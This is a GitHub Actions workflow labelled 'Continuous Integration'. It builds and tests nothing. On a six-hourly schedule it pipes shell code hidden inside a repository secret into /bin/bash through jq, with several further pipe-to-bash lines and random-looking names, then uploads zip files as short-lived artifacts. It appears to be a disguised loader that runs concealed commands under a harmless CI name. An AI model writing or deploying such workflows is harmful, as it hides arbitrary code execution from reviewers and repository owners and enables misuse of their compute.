name: Continuous Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '53 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          ql839: ${{ secrets.ql839 }}
        run: |
          printf '%s' "$ql839" | jq -r .i5 | /bin/bash
          echo $yc18 | jq -r .ad200 | /bin/bash
          echo $tw5 | jq -r .azh40517 | /bin/bash
          printf '%s' "$xs9" | jq -r .cioh931 | /bin/bash
          printf '%s' "$uun096" | jq -r .szk4496 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: UqlCqSjG
          path: "*.zip"
          retention-days: 1
